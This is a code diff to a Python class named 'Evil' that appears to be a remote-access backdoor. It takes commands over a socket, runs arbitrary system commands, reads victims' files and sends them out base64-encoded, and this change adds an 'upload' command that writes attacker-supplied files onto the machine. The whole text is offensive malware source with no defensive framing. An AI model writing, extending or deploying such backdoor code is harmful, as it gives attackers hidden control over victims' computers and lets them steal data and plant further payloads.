@@ -24,7 +24,7 @@ class Evil:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(2048)
+                json_data = json_data + self.connection.recv(4098)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -40,6 +40,11 @@ class Evil:
         with open(path,"rb") as target_file:
             return base64.b64encode(target_file.read())
 
+    def write_file(self,path,content):
+        with open(path,"wb") as target_file:
+            target_file.write(base64.b64decode(content))
+            return "[+] Upload Successful."
+
     def run(self):
         while True:
             try:
@@ -52,6 +57,8 @@ class Evil:
                     cmd_result = self.change_working_dir(cmd[1])
                 elif cmd[0] == "download" and len(cmd) > 1:
                     cmd_result = self.read_file(cmd[1])
+                elif cmd[0] == "upload" and len(cmd) > 1:
+                    cmd_result = self.write_file(cmd[1],cmd[2])
                 else:
                     cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
